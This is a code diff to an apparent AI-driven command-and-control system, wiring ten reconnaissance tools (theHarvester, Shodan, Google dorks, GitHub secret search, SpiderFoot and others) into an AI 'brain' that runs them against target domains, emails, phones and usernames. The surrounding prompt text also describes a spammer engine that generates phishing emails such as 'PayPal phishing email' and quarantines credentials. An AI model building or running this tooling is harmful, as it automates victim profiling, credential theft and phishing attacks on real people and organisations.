@@ -26,6 +26,7 @@ from src.ai_brain.memory import BrainMemory
 from src.ai_brain.payload_strategist import PayloadStrategist
 from src.c2_server.tool_engine import TOOLS, tool_engine
 from src.c2_server.spammer import spammer_engine, TONAL_TEMPLATES, BOILERPLATE_TEMPLATES
+from src.c2_server.osint import osint_engine
 
 logger = logging.getLogger("ai_brain.brain")
 
@@ -707,6 +708,17 @@ class AIBrain:
             "   credential quarantine, A/B testing with winner detection.\n"
             "   generate_spam_html — Ask Chatz to create an HTML email for a specific use case.\n"
             "   Provide a prompt like 'PayPal phishing email' and optional tone.\n\n"
+            "🔍 OSINT SUITE — 10 intelligence gathering tools. All return JSON results.\n"
+            "   osint_theharvester — Domain recon: scrape emails, subdomains, hosts. Params: domain, sources\n"
+            "   osint_shodan — Search internet-connected devices. Params: query, max_results\n"
+            "   osint_google_dork — Google advanced search hacking. Params: dork\n"
+            "   osint_phoneinfoga — Phone number intelligence. Params: phone\n"
+            "   osint_holehe — Check email on 120+ platforms. Params: email\n"
+            "   osint_instaloader — Instagram profile stats. Params: username\n"
+            "   osint_gitdorker — Search GitHub for secrets. Params: query, target\n"
+            "   osint_sn0int — Recon framework for domain/phone/identity. Params: target, module\n"
+            "   osint_spiderfoot — Full auto-recon, 200+ modules. Params: target\n"
+            "   osint_maltego — Relationship graph visualization. Params: entity, entity_type\n\n"
             "═══════════════════════════════════════════════════════════\n"
             "  CORE C2 COMMANDS:\n"
             "═══════════════════════════════════════════════════════════\n"
@@ -781,9 +793,12 @@ class AIBrain:
             tool_actions = []
             beacon_actions = []
             spammer_actions = []
+            osint_actions = []
             for a in actions:
                 raw_type = a.get("type", "")
-                if raw_type.startswith("spam_") or raw_type.startswith("import_spam") or raw_type.startswith("create_spam") or raw_type.startswith("generate_spam") or raw_type.startswith("set_spam") or raw_type.startswith("start_spam") or raw_type.startswith("stop_spam") or raw_type.startswith("validate_spam") or raw_type.startswith("unquarantine_spam"):
+                if raw_type.startswith("osint_"):
+                    osint_actions.append(a)
+                elif raw_type.startswith("spam_") or raw_type.startswith("import_spam") or raw_type.startswith("create_spam") or raw_type.startswith("generate_spam") or raw_type.startswith("set_spam") or raw_type.startswith("start_spam") or raw_type.startswith("stop_spam") or raw_type.startswith("validate_spam") or raw_type.startswith("unquarantine_spam"):
                     spammer_actions.append(a)
                 else:
                     tool_name = raw_type[4:] if raw_type.startswith("run_") else raw_type
@@ -868,6 +883,54 @@ class AIBrain:
                         "detail": f"{a_type}: {str(e)[:200]}",
                         "actions_taken": [a_type],
                     })
+
+            # Execute OSINT tool commands — return JSON, Chatz interprets for user
+            for a in osint_actions:
+                a_type = a.get("type", "")
+                params = a.get("params", {})
+                logger.info(f"[AI] Executing OSINT: {a_type}")
+                try:
+                    osint_name = a_type[6:]  # strip "osint_" prefix
+                    target = params.get("domain") or params.get("query") or params.get("email") or params.get("phone") or params.get("username") or params.get("dork") or params.get("entity") or params.get("target") or ""
+                    io2 = params.get("sources") or params.get("max_results") or params.get("module") or params.get("entity_type") or ""
+
+                    if osint_name == "theharvester":
+                        r = await osint_engine.run_the_harvester(params.get("domain", target), params.get("sources", "all"))
+                    elif osint_name == "shodan":
+                        r = await osint_engine.run_shodan(params.get("query", target), int(params.get("max_results", 10)))
+                    elif osint_name == "google_dork":
+                        r = await osint_engine.run_google_dork(params.get("dork", target))
+                    elif osint_name == "phoneinfoga":
+                        r = await osint_engine.run_phoneinfoga(params.get("phone", target))
+                    elif osint_name == "holehe":
+                        r = await osint_engine.run_holehe(params.get("email", target))
+                    elif osint_name == "instaloader":
+                        r = await osint_engine.run_instaloader(params.get("username", target))
+                    elif osint_name == "gitdorker":
+                        r = await osint_engine.run_gitdorker(params.get("query", target), params.get("target", ""))
+                    elif osint_name == "sn0int":
+                        r = await osint_engine.run_sn0int(params.get("target", target), params.get("module", "domain"))
+                    elif osint_name == "spiderfoot":
+                        r = await osint_engine.run_spiderfoot(params.get("target", target))
+                    elif osint_name == "maltego":
+                        r = await osint_engine.run_maltego(params.get("entity", target), params.get("entity_type", "domain"))
+                    else:
+                        logger.warning(f"[AI] Unknown OSINT action: {a_type}")
+                        executed.append(f"Unknown OSINT: {osint_name}")
+                        continue
+
+                    executed.append(f"osint:{osint_name}")
+                    output = r.get("output", r.get("error", json.dumps(r, indent=2)[:500]))
+                    result["response"] = (result["response"] + f"\n\n🔍 [{osint_name}] Results for {target}\n{output}").strip()
+                    await self.memory.record_decision({
+                        "type": f"osint_{osint_name}",
+                        "detail": f"{osint_name}: {target} — {r.get('status', 'completed')}",
+                        "actions_taken": [f"osint_{osint_name}"],
+                    })
+                except Exception as e:
+                    logger.warning(f"[AI] OSINT action {a_type} failed: {e}")
+                    executed.append(f"OSINT error: {str(e)[:60]}")
+                    result["response"] = (result["response"] + f"\n\n🔍 [{osint_name}] Error: {str(e)[:200]}").strip()
 
             # Execute tool commands via tool_engine
             for a in tool_actions:
